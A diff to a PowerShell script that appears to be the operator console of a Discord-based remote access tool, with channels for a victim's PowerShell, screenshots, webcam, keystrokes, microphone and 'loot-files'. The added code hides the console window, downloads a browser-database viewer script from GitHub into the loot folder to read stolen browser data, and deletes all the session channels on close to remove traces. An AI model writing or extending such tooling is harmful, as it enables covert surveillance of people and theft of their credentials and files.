@@ -27,7 +27,9 @@ $token = 'TOKEN_1_HERE' # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
 $token2 = 'TOKEN_2_HERE' # BOT TO SEND MESSAGES AS USER
 
 # ============================ SCRIPT SETUP =============================
-$hidewindow = 1
+$deleteonclose = 1 #Delete channels on closing session
+$hidewindow = 1 #Hide the console window
+
 If ($HideWindow -gt 0){
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -436,6 +438,41 @@ function DisplayNewMSG{
 
 }
 
+Function DeleteChannels {
+    param([string[]]$channelNames)
+    
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }    
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", $headers.Authorization)    
+    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+    $guilds = $response | ConvertFrom-Json
+
+    foreach ($guild in $guilds) {
+        $guildID = $guild.id
+        $uri = "https://discord.com/api/guilds/$guildID/channels"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", $headers.Authorization)        
+        $response = $wc.DownloadString($uri)
+        $channels = $response | ConvertFrom-Json
+
+        foreach ($channel in $channels) {
+            if ($channel.name -in $channelNames) {
+                $channelID = $channel.id
+                $deleteUri = "https://discord.com/api/v10/channels/$channelID"
+                try {
+                    $wc.Headers.Add("Content-Type", "application/json")
+                    $response = $wc.UploadString($deleteUri, "DELETE", "")
+                    Write-Host "Deleted channel: $($channel.name) with ID: $($channelID)"
+                } catch {
+                    Write-Host "Failed to delete channel: $($channel.name) with ID: $($channelID). Error: $_"
+                }
+            }
+        }
+    }
+}
+
 function get-lootfiles {
     param ([string]$ID,[string]$lootPath)
     $headers = @{
@@ -445,6 +482,10 @@ function get-lootfiles {
     $wc.Headers.Add("Authorization", $headers.Authorization)
     $messages1 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID/messages")
     $messages1 = $messages1 | ConvertFrom-Json
+    
+    $viewer = 'https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Information%20Enumeration/Browser-DB-File-Viewer.ps1'
+    $viewPath = Join-Path -Path $lootPath -ChildPath 'DB-View.ps1'
+    $wc.DownloadFile($viewer, $viewPath)
     foreach ($message in $messages1) {
 
         foreach ($attachment in $message.attachments) {
@@ -552,15 +593,17 @@ Add-OutputBoxLine -Outfeed "PS Command Sent : $msgtosend" -OutputBoxName "Output
 })
 
 $button2.Add_Click({
-
-    $msgtosend = $TextBoxInput.Text
     $sure = (New-Object -ComObject Wscript.Shell).Popup("Are you Sure you want to quit?",0,"Close Session",0x1)
     if ($sure -eq 1){
         Add-OutputBoxLine -Outfeed "CLOSING SESSION" -OutputBoxName "OutputBox3" -ForeColor "Red"
         sendMsg -Message 'close' -id $ID3
-        sleep 3
+        sleep 5
+        If ($deleteonclose -gt 0){
+            $channelNamesToDelete = @("powershell", "screenshots", "webcam", "session-control", "loot-files", "keycapture", "microphone")
+            DeleteChannels -channelNames $channelNamesToDelete
+        }
         $form.Close()
-        sleep 1
+        sleep 2
         exit
     }
 })
